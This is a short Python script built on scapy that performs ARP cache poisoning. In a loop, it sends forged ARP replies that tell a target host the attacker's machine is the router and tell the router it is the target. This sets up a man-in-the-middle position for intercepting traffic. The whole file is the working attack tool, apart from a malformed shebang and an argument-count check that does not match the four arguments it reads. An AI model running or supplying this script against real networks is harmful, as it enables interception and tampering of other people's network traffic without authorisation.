#! usr/bin/etc python3

import scapy.all as scapy
import os
import sys
import time


# op = 2 means response not request
# Target ip [pdst]
# Target mac address [hwdst]
# Router address [psrsc]

# Tell the router you are the victim
# Tell the victim you are the router 

def poison_arp(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) #Associate the mac address of router with kali machine
    scapy.send(packet)



def main():
    if(len(sys.argv) < 4):
        print("Pass in Target IP + MAC && Spoof IP + MAC. . . [4] total args")
    else:
        t_ip = sys.argv[1]
        m_ip = sys.argv[2]
        s_ip = sys.argv[3]
        s_m = sys.argv[4]

        while True:
            poison_arp(t_ip, m_ip, s_ip)
            poison_arp(s_ip, s_m, t_ip)
            time.sleep(2)

if __name__ == '__main__':
    main()